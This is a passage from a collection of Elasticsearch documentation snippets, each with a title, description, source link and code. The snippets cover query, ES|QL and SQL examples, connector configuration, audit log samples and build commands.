Iterator<TimeValue> {\n\n        private final RetryState retryState;\n\n        private BackoffIterator(RetryState retryState) {\n            this.retryState = retryState;\n        }\n\n        @Override\n        public boolean hasNext() {\n            return true;\n        }\n\n        @Override\n        public TimeValue next() {\n            return backoff.next(retryState);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Saturation Function in Script\nDESCRIPTION: This snippet demonstrates how to use the saturation function within a script to calculate a custom score.  The saturation function `saturation(value,k) = value/(k + value)` is used to modify the score based on the 'my-int' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n\"script\" : {\n    \"source\" : \"saturation(doc['my-int'].value, 1)\"\n}\n```\n\n----------------------------------------\n\nTITLE: GROK Pattern with Type Conversion in ESQL\nDESCRIPTION: Shows how to convert GROK-extracted fields to specific data types like integer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-process-data-with-dissect-grok.md#2025-04-21_snippet_14\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"2023-01-23T12:15:00.000Z 127.0.0.1 some.email@foo.com 42\"\n| GROK a \"\"\"%{TIMESTAMP_ISO8601:date} %{IP:ip} %{EMAILADDRESS:email} %{NUMBER:num:int}\"\"\"\n| KEEP date, ip, email, num\n```\n\n----------------------------------------\n\nTITLE: Adding New Elasticsearch User\nDESCRIPTION: Example showing how to add a new user 'jacknich' with password 'theshining' and assign 'network' and 'monitoring' roles.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/users-command.md#2025-04-21_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-users useradd jacknich -p theshining -r network,monitoring\n```\n\n----------------------------------------\n\nTITLE: Indexing a GeoJSON Polygon with Custom Orientation in Elasticsearch\nDESCRIPTION: Example of indexing a GeoJSON polygon with a LEFT orientation that crosses the international dateline. The orientation parameter overrides the default RIGHT orientation specified in the GeoJSON specification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_9\n\nLANGUAGE: json\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"Polygon\",\n    \"orientation\" : \"LEFT\",\n    \"coordinates\" : [\n      [ [-177.0, 10.0], [176.0, 15.0], [172.0, 0.0], [176.0, -15.0], [-177.0, -10.0], [-177.0, 10.0] ]\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Histogram Aggregation with Keyed Response Format\nDESCRIPTION: Example demonstrating how to request a keyed response format for histogram buckets. Instead of returning an array, the response contains a hash keyed by the bucket keys.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-histogram-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"prices\": {\n      \"histogram\": {\n        \"field\": \"price\",\n        \"interval\": 50,\n        \"keyed\": true\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"prices\": {\n      \"buckets\": {\n        \"0.0\": {\n          \"key\": 0.0,\n          \"doc_count\": 1\n        },\n        \"50.0\": {\n          \"key\": 50.0,\n          \"doc_count\": 1\n        },\n        \"100.0\": {\n          \"key\": 100.0,\n          \"doc_count\": 0\n        },\n        \"150.0\": {\n          \"key\": 150.0,\n          \"doc_count\": 2\n        },\n        \"200.0\": {\n          \"key\": 200.0,\n          \"doc_count\": 3\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Docker Deployment Configuration for Microsoft SQL Connector\nDESCRIPTION: This snippet contains the necessary configuration to run the Microsoft SQL connector using Docker. It includes example values for the Elasticsearch host and API key, as well as instructions for modifying the configuration file correctly.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-ms-sql.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n\"# When connecting to your cloud deployment you should edit the host value\\nelasticsearch.host: http://host.docker.internal:9200\\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\\n\\nconnectors:\\n  -\\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\\n    service_type: mssql\\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\"\n```\n\n----------------------------------------\n\nTITLE: Simple Field Query with QUERY in Elasticsearch SQL\nDESCRIPTION: Example showing how to search for documents where the name field contains 'dune' using the query_string syntax.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-search.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSELECT author, name, SCORE() FROM library WHERE QUERY('name:dune');\n\n    author     |       name        |    SCORE()\n---------------+-------------------+---------------\nFrank Herbert  |Dune               |2.2886353\nFrank Herbert  |Dune Messiah       |1.8893257\nFrank Herbert  |Children of Dune   |1.6086556\nFrank Herbert  |God Emperor of Dune|1.4005898\n```\n\n----------------------------------------\n\nTITLE: Performing Term Query with ESQL TERM Function\nDESCRIPTION: The TERM function is used in Elasticsearch SQL to perform a Term query on a specified field. It returns true if the provided term matches the row. This example demonstrates how to use TERM to filter books based on the author field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/term.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM books\n| WHERE TERM(author, \"gabriel\")\n```\n\n----------------------------------------\n\nTITLE: Basic SELECT Statement Syntax in Elasticsearch SQL\nDESCRIPTION: The complete syntax for SELECT statements in Elasticsearch SQL, showing all possible clauses including FROM, WHERE, GROUP BY, HAVING, ORDER BY, LIMIT, and PIVOT options.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT [TOP [ count ] ] select_expr [, ...]\n[ FROM table_name ]\n[ WHERE condition ]\n[ GROUP BY grouping_element [, ...] ]\n[ HAVING condition]\n[ ORDER BY expression [ ASC | DESC ] [, ...] ]\n[ LIMIT [ count ] ]\n[ PIVOT ( aggregation_expr FOR column IN ( value [ [ AS ] alias ] [, ...] ) ) ]\n```\n\n----------------------------------------\n\nTITLE: Custom Pattern Definition for GitHub Usernames\nDESCRIPTION: Example showing how to create and use a custom pattern definition to redact GitHub usernames using the pattern_definitions option.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/redact-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST _ingest/pipeline/_simulate\n{\n  \"pipeline\": {\n    \"processors\": [\n      {\n        \"redact\": {\n          \"field\": \"message\",\n          \"patterns\": [\n            \"%{GITHUB_NAME:GITHUB_NAME}\"\n          ],\n          \"pattern_definitions\": {\n            \"GITHUB_NAME\": \"@%{USERNAME}\"\n          }\n        }\n      }\n    ]\n  },\n  \"docs\": [\n    {\n      \"_source\": {\n        \"message\": \"@elastic-data-management the PR is ready for review\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Date and Time Functions in Elasticsearch SQL\nDESCRIPTION: A list of date and time related SQL functions supported in Elasticsearch. These functions allow for various operations such as date formatting, parsing, arithmetic, and extraction of specific date components.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/qa/server/single-node/src/javaRestTest/resources/org/elasticsearch/xpack/sql/qa/single_node/ConsistentFunctionArgHandlingIT-non-tested-functions.txt#2025-04-21_snippet_0\n\nLANGUAGE: SQL\nCODE:\n```\nCURDATE\nCURRENT_DATE\nCURRENT_TIME\nCURRENT_TIMESTAMP\nCURTIME\nDATEADD\nDATEDIFF\nDATE_FORMAT\nDATEPART\nDATETIME_FORMAT\nDATETIME_PARSE\nDATETRUNC\nDATE_ADD\nDATE_DIFF\nDATE_PARSE\nDATE_PART\nDATE_TRUNC\nDAY\nDAYNAME\nDAYOFMONTH\nDAYOFWEEK\nDAYOFYEAR\nDAY_NAME\nDAY_OF_MONTH\nDAY_OF_WEEK\nDAY_OF_YEAR\nDOM\nDOW\nDOY\nFORMAT\nHOUR\nHOUR_OF_DAY\nIDOW\nISODAYOFWEEK\nISODOW\nISOWEEK\nISOWEEKOFYEAR\nISO_DAY_OF_WEEK\nISO_WEEK_OF_YEAR\nIW\nIWOY\nMINUTE\nMINUTE_OF_DAY\nMINUTE_OF_HOUR\nMONTH\nMONTHNAME\nMONTH_NAME\nMONTH_OF_YEAR\nNOW\nQUARTER\nSECOND\nSECOND_OF_MINUTE\nTIMESTAMPADD\nTIMESTAMPDIFF\nTIMESTAMP_ADD\nTIMESTAMP_DIFF\nTIME_PARSE\nTODAY\nTO_CHAR\nWEEK\nWEEK_OF_YEAR\nYEAR\n```\n\n----------------------------------------\n\nTITLE: Create Elasticsearch index with date and geo_point fields\nDESCRIPTION: This snippet creates an Elasticsearch index named `items` with mappings for `name` (keyword), `production_date` (date), and `location` (geo_point) fields. This index is required to use the distance_feature query with date or geo_point fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-distance-feature-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /items\n{\n  \"mappings\": {\n    \"properties\": {\n      \"name\": {\n        \"type\": \"keyword\"\n      },\n      \"production_date\": {\n        \"type\": \"date\"\n      },\n      \"location\": {\n        \"type\": \"geo_point\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Rescoring Collapsed Search Results\nDESCRIPTION: Shows how to use the rescore parameter with field collapsing to apply a secondary scoring logic to the top-ranked document per collapsed field. This example rescores using a match_phrase query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/collapse-search-results.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"message\": \"you know for search\"\n    }\n  },\n  \"collapse\": {\n    \"field\": \"user.id\"\n  },\n  \"rescore\" : {\n      \"window_size\" : 50,\n      \"query\" : {\n         \"rescore_query\" : {\n            \"match_phrase\": {\n                \"message\": \"you know for search\"\n            }\n         },\n         \"query_weight\" : 0.3,\n         \"rescore_query_weight\" : 1.4\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch Rank Evaluation API with Mean Reciprocal Rank Metric\nDESCRIPTION: This snippet shows how to use the Elasticsearch Rank Evaluation API with the Mean Reciprocal Rank metric. It sets the k value to 20 and the relevant rating threshold to 1.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-rank-eval.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_rank_eval\n{\n  \"requests\": [\n    {\n      \"id\": \"JFK query\",\n      \"request\": { \"query\": { \"match_all\": {} } },\n      \"ratings\": []\n    } ],\n  \"metric\": {\n    \"mean_reciprocal_rank\": {\n      \"k\": 20,\n      \"relevant_rating_threshold\": 1\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Single vs Double Quotes in Elasticsearch SQL\nDESCRIPTION: Illustrates the difference between single quotes (for string literals) and double quotes (for identifiers) in Elasticsearch SQL syntax.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-lexical-structure.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nSELECT \"first_name\" \n  FROM \"musicians\"  \n WHERE \"last_name\"  \n     = 'Carroll'    \n```\n\n----------------------------------------\n\nTITLE: Type Support Table in Markdown\nDESCRIPTION: Markdown table showing the mapping between string input types (keyword and text) and their result types in ESQL functions. This is an auto-generated reference meant for documentation purposes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/to_base64.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| string | result |\n| --- | --- |\n| keyword | keyword |\n| text | keyword |\n```\n\n----------------------------------------\n\nTITLE: Including ST_INTERSECTS Function Types in Markdown\nDESCRIPTION: This code snippet includes the supported types documentation for the ST_INTERSECTS function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/st_intersects.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/st_intersects.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Using ROUND Function in Elasticsearch SQL\nDESCRIPTION: Rounds a numeric expression to a specified number of decimal places. If the second parameter is negative, it rounds to places left of the decimal point. Returns the same data type as the input.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_25\n\nLANGUAGE: sql\nCODE:\n```\nROUND(\n    numeric_exp      <1>\n    [, integer_exp]) <2>\n```\n\n----------------------------------------\n\nTITLE: Extracting Coordinates in Elasticsearch ESQL\nDESCRIPTION: This snippet demonstrates how to extract the x and y coordinates from a geographical point expressed as a string in ESQL. It converts the string representation of the point into a geo_point using the TO_GEOPOINT function and then retrieves the x and y coordinates using the ST_X and ST_Y functions, respectively. The snippet assumes the input is a well-formed 'POINT' string and requires Elasticsearch's ESQL functionalities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/st_y.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW point = TO_GEOPOINT(\"POINT(42.97109629958868 14.7552534006536)\")\n| EVAL x =  ST_X(point), y = ST_Y(point)\n```\n\n----------------------------------------\n\nTITLE: Interactive Program License Notice Template\nDESCRIPTION: Example of a short license notice to be displayed when an interactive program starts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-core-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\nGnomovision version 69, Copyright (C) year name of author\nGnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n`show w'. This is free software, and you are welcome to redistribute\nit under certain conditions; type `show c' for details.\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with Decimal Digit Filter in Elasticsearch\nDESCRIPTION: Example of using the create index API to configure a custom analyzer that uses the decimal_digit filter with a whitespace tokenizer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-decimal-digit-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /decimal_digit_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"whitespace_decimal_digit\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"decimal_digit\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Source Filtering with Field Alias Limitation\nDESCRIPTION: Illustrates a limitation where field aliases cannot be used in source filtering operations, resulting in an empty source response.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/field-alias.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\" : {\n    \"match_all\": {}\n  },\n  \"_source\": \"route_length_miles\"\n}\n```\n\n----------------------------------------\n\nTITLE: Input Document Example for URI Processing\nDESCRIPTION: Sample document containing a URI string that will be processed by the URI parts processor.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/uri-parts-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"_source\": {\n    \"input_field\": \"http://myusername:mypassword@www.example.com:80/foo.gif?key1=val1&key2=val2#fragment\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Redis Connector for Docker Deployment\nDESCRIPTION: YAML configuration for setting up the Redis connector as a self-managed connector using Docker. Includes Elasticsearch connection details and connector settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-redis.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: redis\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Pre-Increment Operator in Painless\nDESCRIPTION: This snippet illustrates the use of the pre-increment operator '++' with different numeric types in Painless, showing its behavior including type promotion and implicit casting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_4\n\nLANGUAGE: painless\nCODE:\n```\nshort i = 0;\n++i;\nlong j = 1;\nlong k;\nk = ++j;\n```\n\n----------------------------------------\n\nTITLE: Documentation Template Comment - Markdown\nDESCRIPTION: Header comment indicating this is an auto-generated file by ESQL's AbstractFunctionTestCase that should not be edited manually.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/exp.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Listing All SQL Functions in Elasticsearch\nDESCRIPTION: Example of using SHOW FUNCTIONS to list all available SQL functions in Elasticsearch along with their types (AGGREGATE, SCALAR, CONDITIONAL, etc.).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-functions.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSHOW FUNCTIONS;\n\n      name       |     type\n-----------------+---------------\nAVG              |AGGREGATE\nCOUNT            |AGGREGATE\nFIRST            |AGGREGATE\nFIRST_VALUE      |AGGREGATE\nLAST             |AGGREGATE\nLAST_VALUE       |AGGREGATE\nMAX              |AGGREGATE\nMIN              |AGGREGATE\nSUM              |AGGREGATE\nKURTOSIS         |AGGREGATE\nMAD              |AGGREGATE\nPERCENTILE       |AGGREGATE\nPERCENTILE_RANK  |AGGREGATE\nSKEWNESS         |AGGREGATE\nSTDDEV_POP       |AGGREGATE\nSTDDEV_SAMP      |AGGREGATE\nSUM_OF_SQUARES   |AGGREGATE\nVAR_POP          |AGGREGATE\nVAR_SAMP         |AGGREGATE\nHISTOGRAM        |GROUPING\nCASE             |CONDITIONAL\nCOALESCE         |CONDITIONAL\nGREATEST         |CONDITIONAL\nIFNULL           |CONDITIONAL\nIIF              |CONDITIONAL\nISNULL           |CONDITIONAL\nLEAST            |CONDITIONAL\nNULLIF           |CONDITIONAL\nNVL              |CONDITIONAL\nCURDATE          |SCALAR\nCURRENT_DATE     |SCALAR\nCURRENT_TIME     |SCALAR\nCURRENT_TIMESTAMP|SCALAR\nCURTIME          |SCALAR\nDATEADD          |SCALAR\nDATEDIFF         |SCALAR\nDATEPART         |SCALAR\nDATETIME_FORMAT  |SCALAR\nDATETIME_PARSE   |SCALAR\nDATETRUNC        |SCALAR\nDATE_ADD         |SCALAR\nDATE_DIFF        |SCALAR\nDATE_FORMAT      |SCALAR\nDATE_PARSE       |SCALAR\nDATE_PART        |SCALAR\nDATE_TRUNC       |SCALAR\nDAY              |SCALAR\nDAYNAME          |SCALAR\nDAYOFMONTH       |SCALAR\nDAYOFWEEK        |SCALAR\nDAYOFYEAR        |SCALAR\nDAY_NAME         |SCALAR\nDAY_OF_MONTH     |SCALAR\nDAY_OF_WEEK      |SCALAR\nDAY_OF_YEAR      |SCALAR\nDOM              |SCALAR\nDOW              |SCALAR\nDOY              |SCALAR\nFORMAT           |SCALAR\nHOUR             |SCALAR\nHOUR_OF_DAY      |SCALAR\nIDOW             |SCALAR\nISODAYOFWEEK     |SCALAR\nISODOW           |SCALAR\nISOWEEK          |SCALAR\nISOWEEKOFYEAR    |SCALAR\nISO_DAY_OF_WEEK  |SCALAR\nISO_WEEK_OF_YEAR |SCALAR\nIW               |SCALAR\nIWOY             |SCALAR\nMINUTE           |SCALAR\nMINUTE_OF_DAY    |SCALAR\nMINUTE_OF_HOUR   |SCALAR\nMONTH            |SCALAR\nMONTHNAME        |SCALAR\nMONTH_NAME       |SCALAR\nMONTH_OF_YEAR    |SCALAR\nNOW              |SCALAR\nQUARTER          |SCALAR\nSECOND           |SCALAR\nSECOND_OF_MINUTE |SCALAR\nTIMESTAMPADD     |SCALAR\nTIMESTAMPDIFF    |SCALAR\nTIMESTAMP_ADD    |SCALAR\nTIMESTAMP_DIFF   |SCALAR\nTIME_PARSE       |SCALAR\nTODAY            |SCALAR\nTO_CHAR          |SCALAR\nWEEK             |SCALAR\nWEEK_OF_YEAR     |SCALAR\nYEAR             |SCALAR\nABS              |SCALAR\nACOS             |SCALAR\nASIN             |SCALAR\nATAN             |SCALAR\nATAN2            |SCALAR\nCBRT             |SCALAR\nCEIL             |SCALAR\nCEILING          |SCALAR\nCOS              |SCALAR\nCOSH             |SCALAR\nCOT              |SCALAR\nDEGREES          |SCALAR\nE                |SCALAR\nEXP              |SCALAR\nEXPM1            |SCALAR\nFLOOR            |SCALAR\nLOG              |SCALAR\nLOG10            |SCALAR\nMOD              |SCALAR\nPI               |SCALAR\nPOWER            |SCALAR\nRADIANS          |SCALAR\nRAND             |SCALAR\nRANDOM           |SCALAR\nROUND            |SCALAR\nSIGN             |SCALAR\nSIGNUM           |SCALAR\nSIN              |SCALAR\nSINH             |SCALAR\nSQRT             |SCALAR\nTAN              |SCALAR\nTRUNC            |SCALAR\nTRUNCATE         |SCALAR\nASCII            |SCALAR\nBIT_LENGTH       |SCALAR\nCHAR             |SCALAR\nCHARACTER_LENGTH |SCALAR\nCHAR_LENGTH      |SCALAR\nCONCAT           |SCALAR\nINSERT           |SCALAR\nLCASE            |SCALAR\nLEFT             |SCALAR\nLENGTH           |SCALAR\nLOCATE           |SCALAR\nLTRIM            |SCALAR\nOCTET_LENGTH     |SCALAR\nPOSITION         |SCALAR\nREPEAT           |SCALAR\nREPLACE          |SCALAR\nRIGHT            |SCALAR\nRTRIM            |SCALAR\nSPACE            |SCALAR\nSTARTS_WITH      |SCALAR\nSUBSTRING        |SCALAR\nTRIM             |SCALAR\nUCASE            |SCALAR\nCAST             |SCALAR\nCONVERT          |SCALAR\nDATABASE         |SCALAR\nUSER             |SCALAR\nST_ASTEXT        |SCALAR\nST_ASWKT         |SCALAR\nST_DISTANCE      |SCALAR\nST_GEOMETRYTYPE  |SCALAR\nST_GEOMFROMTEXT  |SCALAR\nST_WKTTOSQL      |SCALAR\nST_X             |SCALAR\nST_Y             |SCALAR\nST_Z             |SCALAR\nSCORE            |SCORE\n```\n\n----------------------------------------\n\nTITLE: Calculating Arccosine Using ACOS() Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the ACOS() function in ESQL to calculate the arccosine of a value. It creates a row with a single field 'a' set to 0.9, then applies the ACOS() function to this value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/acos.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=.9\n| EVAL acos=ACOS(a)\n```\n\n----------------------------------------\n\nTITLE: Pivoting and Ordering Results with LIMIT\nDESCRIPTION: This SQL snippet shows how to apply `ORDER BY` and `LIMIT` clauses after performing a pivot operation. This allows for refined control over the output, enabling users to view a specific number of results ordered in descending order based on the `languages` column.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_33\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM (SELECT languages, gender, salary FROM test_emp) PIVOT (AVG(salary) FOR gender IN ('F')) ORDER BY languages DESC LIMIT 4;\n```\n\n----------------------------------------\n\nTITLE: Output of Keep Words Filter Analysis in Elasticsearch\nDESCRIPTION: This snippet shows the output produced by the Keep Words filter, containing only the tokens 'fox' and 'dog'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-keep-words-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n[ fox, dog ]\n```\n\n----------------------------------------\n\nTITLE: Setting multiple index routing allocation filters in Elasticsearch\nDESCRIPTION: Demonstrates how to specify multiple routing allocation filters for an index, requiring shards to be allocated to 'big' nodes in 'rack1'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/shard-allocation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT test/_settings\n{\n  \"index.routing.allocation.require.size\": \"big\",\n  \"index.routing.allocation.require.rack\": \"rack1\"\n}\n```\n\n----------------------------------------\n\nTITLE: Project ID Derivation Note\nDESCRIPTION: Important note about project ID derivation limitations, specifically that system properties and environment variables are not supported for this purpose.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage.md#2025-04-21_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\nNote: Deriving the project id from system properties or environment variables\n(`GOOGLE_CLOUD_PROJECT` or `GCLOUD_PROJECT`) is not supported.\n```\n\n----------------------------------------\n\nTITLE: Logging delete_role Event in Elasticsearch\nDESCRIPTION: Example of an audit log for the delete role event. This event is logged when the delete role API is invoked to delete a role in the security system.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/elasticsearch-audit-events.md#2025-04-21_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\n{\"type\":\"audit\", \"timestamp\":\"2020-12-31T00:08:11,678+0200\", \"node.id\":\n\"0RMNyghkQYCc_gVd1G6tZQ\", \"event.type\":\"security_config_change\", \"event.action\":\n\"delete_role\", \"request.id\":\"155IKq3zQdWq-12dgKZRnw\",\n\"delete\":{\"role\":{\"name\":\"my_admin_role\"}}}\n```\n\n----------------------------------------\n\nTITLE: Compiling HSDis for Disassembly\nDESCRIPTION: Shell commands for cloning and building HSDis for JVM disassembly support\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/benchmarks/README.md#2025-04-21_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ngit clone git@github.com:openjdk/jdk.git\ncd jdk\ngit checkout jdk-24-ga\nwget https://ftp.gnu.org/gnu/binutils/binutils-2.35.tar.gz\ntar xf binutils-2.35.tar.gz\nbash configure --with-hsdis=binutils --with-binutils-src=binutils-2.35 \\\n    --with-boot-jdk=~/.gradle/jdks/oracle_corporation-24-amd64-linux.2\nmake build-hsdis\ncp ./build/linux-x86_64-server-release/jdk/lib/hsdis-amd64.so \\\n    ~/.gradle/jdks/oracle_corporation-24-amd64-linux.2/lib/hsdis.so\n```\n\n----------------------------------------\n\nTITLE: Downloading Oracle Connector Configuration File\nDESCRIPTION: This snippet shows how to download the sample configuration file for the Oracle connector using curl command.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-oracle.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Copyright Disclaimer Template\nDESCRIPTION: Sample template for a copyright disclaimer to be signed by an employer or institution.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-core-NOTICE.txt#2025-04-21_snippet_2\n\nLANGUAGE: plaintext\nCODE:\n```\nYoyodyne, Inc., hereby disclaims all copyright interest in the\nprogram `Gnomovision' (which makes passes at compilers) written by\nJames Hacker.\n\nsignature of Ty Coon, 1 April 1989\nTy Coon, President of Vice\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Node Tool Synopsis\nDESCRIPTION: Command line syntax for the elasticsearch-node tool showing available commands and options.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/node-tool.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-node repurpose|unsafe-bootstrap|detach-cluster|override-version\n  [-E <KeyValuePair>]\n  [-h, --help] ([-s, --silent] | [-v, --verbose])\n```\n\n----------------------------------------\n\nTITLE: Accessing Array Fields with Dot Notation\nDESCRIPTION: Example showing how to access and copy specific array elements using dot notation in the Set processor.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/set-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /_ingest/pipeline/_simulate\n{\n  \"pipeline\": {\n    \"processors\": [\n      {\n        \"set\": {\n          \"field\": \"my_field\",\n          \"value\": \"{{{input_field.1}}}\"\n        }\n      }\n    ]\n  },\n  \"docs\": [\n    {\n      \"_index\": \"index\",\n      \"_id\": \"id\",\n      \"_source\": {\n        \"input_field\": [\n          \"Ubuntu\",\n          \"Windows\",\n          \"Ventura\"\n        ]\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Response from attachment processor showing extracted document properties\nDESCRIPTION: Response showing the extracted properties from an RTF file, including content type, language, content, and content length.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"found\": true,\n  